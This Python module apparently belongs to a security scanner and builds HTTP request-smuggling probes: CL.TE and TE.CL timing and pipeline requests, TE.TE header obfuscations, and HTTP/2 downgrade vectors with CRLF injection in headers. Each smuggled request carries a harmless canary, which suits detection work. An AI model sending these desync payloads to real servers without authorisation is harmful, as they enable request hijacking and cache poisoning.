"""request_smuggling: Payload generation."""
from __future__ import annotations

from typing import Any, Dict, List, Tuple

from argus.collectors.request_smuggling.models import RequestSmugglingMutationStrategy, RequestSmugglingTechnique


class RequestSmugglingPayloadGenerator:
    """
    Constructs raw HTTP/1.1 and simulated HTTP/2 payloads covering CL.TE, TE.CL,
    TE.TE obfuscations, and pipeline poisoning attacks.
    """

    @staticmethod
    def build_baseline_probe(host: str, path: str = "/") -> str:
        """Constructs a standard, benign HTTP/1.1 GET probe for baseline latency measurement."""
        return (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0 (ARGUS-Smuggling-Prober)\r\n"
            f"Accept: */*\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )

    @staticmethod
    def build_cl_te_timing_probe(host: str, path: str = "/") -> str:
        """
        Constructs a CL.TE differential timing probe.
        Frontend uses Content-Length (declaring 4 bytes).
        Backend uses Transfer-Encoding chunked and waits for next chunk, inducing a timeout delay.
        """
        body = "1\r\nZ\r\nQ\r\n"
        # Content-Length is 4 (covers '1\r\nZ\r\n'), backend parses chunk 1 ('Z') and hangs waiting for next chunk length
        return (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0 (ARGUS-Smuggling-Prober)\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"1\r\n"
            f"Z\r\n"
            f"Q\r\n"
        )

    @staticmethod
    def build_te_cl_timing_probe(host: str, path: str = "/") -> str:
        """
        Constructs a TE.CL differential timing probe.
        Frontend uses Transfer-Encoding chunked (stops at 0\\r\\n\\r\\n).
        Backend uses Content-Length (declaring 6 bytes) and hangs waiting for remaining bytes.
        """
        # Frontend sees valid terminating chunk (0\r\n\r\n) and forwards. Backend expects 6 bytes but gets 5.
        return (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0 (ARGUS-Smuggling-Prober)\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"X"
        )

    @staticmethod
    def build_cl_te_pipeline_probe(
        host: str,
        path: str = "/",
        canary_path: str = "/argus_smuggled_canary",
        canary_header: str = "ARGUS_SMUGGLE_CANARY",
    ) -> Tuple[str, str]:
        """
        Constructs a CL.TE 2-request confirmation sequence.
        Attack probe leaves a partial GET request in the backend socket buffer.
        Follow-up benign probe triggers canary path/header reflection.
        """
        smuggled_request = (
            f"GET {canary_path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Canary: {canary_header}\r\n"
            f"X-Ignore: X"
        )
        chunked_body = (
            f"0\r\n"
            f"\r\n"
            f"{smuggled_request}"
        )
        content_length = len(chunked_body)

        attack_probe = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0 (ARGUS-Smuggling-Prober)\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {content_length}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{chunked_body}"
        )

        follow_up_probe = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0 (ARGUS-Smuggling-Prober)\r\n"
            f"Connection: close\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 5\r\n"
            f"\r\n"
            f"x=123"
        )

        return attack_probe, follow_up_probe

    @staticmethod
    def build_te_cl_pipeline_probe(
        host: str,
        path: str = "/",
        canary_path: str = "/argus_smuggled_canary",
        canary_header: str = "ARGUS_SMUGGLE_CANARY",
    ) -> Tuple[str, str]:
        """
        Constructs a TE.CL 2-request confirmation sequence.
        Attack probe specifies chunk containing smuggled GET request.
        """
        smuggled_request = (
            f"GET {canary_path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Canary: {canary_header}\r\n"
            f"Foo: bar"
        )
        hex_len = hex(len(smuggled_request))[2:]
        chunked_body = (
            f"{hex_len}\r\n"
            f"{smuggled_request}\r\n"
            f"0\r\n"
            f"\r\n"
        )

        attack_probe = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0 (ARGUS-Smuggling-Prober)\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{chunked_body}"
        )

        follow_up_probe = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0 (ARGUS-Smuggling-Prober)\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )

        return attack_probe, follow_up_probe

    @classmethod
    def generate_te_te_mutations(
        cls,
        host: str,
        path: str = "/",
        canary_path: str = "/argus_smuggled_canary",
    ) -> List[Tuple[RequestSmugglingMutationStrategy, str, str, str]]:
        """
        Generates TE.TE obfuscated headers across multiple mutation strategies.
        Returns list of (strategy, attack_probe, follow_up_probe, description).
        """
        mutations: List[Tuple[RequestSmugglingMutationStrategy, str, str, str]] = []

        smuggled = (
            f"GET {canary_path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Canary: ARGUS_SMUGGLE_CANARY\r\n"
            f"X-Ignore: X"
        )
        chunked_body = f"0\r\n\r\n{smuggled}"
        cl = len(chunked_body)

        follow_up = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: close\r\n"
            f"Content-Length: 5\r\n"
            f"\r\n"
            f"x=123"
        )

        # 1. Header Casing & Whitespace Variations
        casing_variants = [
            ("Transfer-Encoding: chunked\r\nTransfer-encoding: [tab]chunked", "Transfer-Encoding: chunked\r\nTransfer-encoding:\tchunked"),
            ("Transfer-Encoding : chunked", "Transfer-Encoding : chunked"),
            ("Transfer-Encoding:  chunked (multiple spaces)", "Transfer-Encoding:  chunked"),
            ("Transfer-Encoding:\\r\\n chunked (multiline folding)", "Transfer-Encoding:\r\n chunked"),
            ("transfer-encoding: chunked (lowercase)", "transfer-encoding: chunked"),
        ]
        for desc, te_hdr in casing_variants:
            probe = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Connection: keep-alive\r\n"
                f"Content-Length: {cl}\r\n"
                f"{te_hdr}\r\n"
                f"\r\n"
                f"{chunked_body}"
            )
            mutations.append((RequestSmugglingMutationStrategy.HEADER_CASING_WHITESPACE, probe, follow_up, desc))

        # 2. Dual Conflicting Headers
        dual_variants = [
            ("Transfer-Encoding: x and Transfer-Encoding: chunked", "Transfer-Encoding: x\r\nTransfer-Encoding: chunked"),
            ("Transfer-Encoding: chunked and Transfer-Encoding: identity", "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity"),
            ("Duplicate Transfer-Encoding headers", "Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked"),
        ]
        for desc, te_hdr in dual_variants:
            probe = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Connection: keep-alive\r\n"
                f"Content-Length: {cl}\r\n"
                f"{te_hdr}\r\n"
                f"\r\n"
                f"{chunked_body}"
            )
            mutations.append((RequestSmugglingMutationStrategy.DUAL_HEADER, probe, follow_up, desc))

        # 3. Hop-by-Hop Stripping
        hop_variants = [
            ("Connection: Transfer-Encoding header stripping", "Connection: Transfer-Encoding\r\nTransfer-Encoding: chunked"),
            ("Connection: keep-alive, Transfer-Encoding", "Connection: keep-alive, Transfer-Encoding\r\nTransfer-Encoding: chunked"),
            ("X-Forwarded-For with Connection: Transfer-Encoding", "X-Forwarded-For: 127.0.0.1\r\nConnection: Transfer-Encoding\r\nTransfer-Encoding: chunked"),
        ]
        for desc, te_hdr in hop_variants:
            probe = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Length: {cl}\r\n"
                f"{te_hdr}\r\n"
                f"\r\n"
                f"{chunked_body}"
            )
            mutations.append((RequestSmugglingMutationStrategy.HOP_BY_HOP, probe, follow_up, desc))

        # 4. Chunk Size Extensions
        chunk_ext_body = f"0;foo=bar\r\n\r\n{smuggled}"
        cl_ext = len(chunk_ext_body)
        probe_ext = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Length: {cl_ext}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{chunk_ext_body}"
        )
        mutations.append((RequestSmugglingMutationStrategy.CHUNK_EXTENSION, probe_ext, follow_up, "Chunk extension: 0;foo=bar\\r\\n\\r\\n"))

        # 5. Hex Casing & Padded Variations
        hex_body = f"0X0\r\n\r\n{smuggled}"
        cl_hex = len(hex_body)
        probe_hex = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Length: {cl_hex}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{hex_body}"
        )
        mutations.append((RequestSmugglingMutationStrategy.HEX_MUTATION, probe_hex, follow_up, "Hex uppercase: 0X0\\r\\n\\r\\n"))

        # 6. Comma-Delimited
        probe_comma = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Length: {cl}\r\n"
            f"Transfer-Encoding: chunked, identity\r\n"
            f"\r\n"
            f"{chunked_body}"
        )
        mutations.append((RequestSmugglingMutationStrategy.COMMA_DELIMITED, probe_comma, follow_up, "Comma delimited: Transfer-Encoding: chunked, identity"))

        return mutations

    @classmethod
    def generate_h2_downgrade_probes(
        cls,
        host: str,
        path: str = "/",
        canary_path: str = "/argus_smuggled_canary",
    ) -> List[Tuple[RequestSmugglingTechnique, RequestSmugglingMutationStrategy, Dict[str, Any], str]]:
        """
        Generates simulated HTTP/2 downgrade smuggling vectors (H2.CL, H2.TE, and pseudo-header CRLF injection).
        Returns list of (technique, strategy, h2_frame_meta, description).
        """
        probes: List[Tuple[RequestSmugglingTechnique, RequestSmugglingMutationStrategy, Dict[str, Any], str]] = []

        smuggled = (
            f"GET {canary_path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Canary: ARGUS_SMUGGLE_CANARY\r\n"
            f"Foo: bar"
        )

        # 1. H2.CL: HTTP/2 request with explicit Content-Length smaller than DATA frames
        probes.append((
            RequestSmugglingTechnique.H2_CL,
            RequestSmugglingMutationStrategy.STANDARD,
            {
                ":method": "POST",
                ":path": path,
                ":authority": host,
                ":scheme": "https",
                "content-length": "0",
                "body": smuggled,
            },
            "H2.CL: HTTP/2 frame with Content-Length: 0 and trailing DATA stream",
        ))

        # 2. H2.TE: HTTP/2 request containing forbidden Transfer-Encoding header
        probes.append((
            RequestSmugglingTechnique.H2_TE,
            RequestSmugglingMutationStrategy.STANDARD,
            {
                ":method": "POST",
                ":path": path,
                ":authority": host,
                ":scheme": "https",
                "transfer-encoding": "chunked",
                "body": f"0\r\n\r\n{smuggled}",
            },
            "H2.TE: HTTP/2 frame with forbidden Transfer-Encoding: chunked preserved during downgrade",
        ))

        # 3. H2 CRLF Injection in :path pseudo-header
        crlf_path = f"{path} HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n{smuggled}"
        probes.append((
            RequestSmugglingTechnique.H2_CRLF,
            RequestSmugglingMutationStrategy.H2_PSEUDO_HEADER,
            {
                ":method": "POST",
                ":path": crlf_path,
                ":authority": host,
                ":scheme": "https",
                "body": "",
            },
            "H2 CRLF: :path pseudo-header CRLF injection inducing HTTP/1.1 chunked boundary desync",
        ))

        # 4. H2 CRLF Injection in custom header value
        probes.append((
            RequestSmugglingTechnique.H2_CRLF,
            RequestSmugglingMutationStrategy.HEADER_CASING_WHITESPACE,
            {
                ":method": "POST",
                ":path": path,
                ":authority": host,
                ":scheme": "https",
                "x-custom-header": f"value\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n{smuggled}",
                "body": "",
            },
            "H2 CRLF: Custom header value CRLF injection",
        ))

        return probes
